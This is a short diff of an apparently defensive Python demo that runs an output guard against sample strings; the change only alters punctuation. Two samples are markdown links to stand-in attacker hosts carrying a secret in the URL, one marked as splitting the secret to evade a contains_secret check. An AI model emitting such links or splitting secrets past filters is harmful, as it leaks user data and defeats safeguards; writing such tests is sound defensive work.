@@ -46,7 +46,7 @@ print(f"Allowlisted domains: {sorted(g.ALLOWED_DOMAINS)}\n")
 print("Output checks on sample strings:")
 samples = [
     f"Here you go! ![ok](https://collect.attacker.example/log?d={g.SECRET})",
-    "See ![logo](https://cdn.nimbusnotes.com/logo.png) — fine, allowlisted.",
+    "See ![logo](https://cdn.nimbusnotes.com/logo.png): fine, allowlisted.",
     "Total exfil: [click](https://evil.test/c?x=B-L-U-E) (secret split, evades contains_secret)",
 ]
 for s in samples:
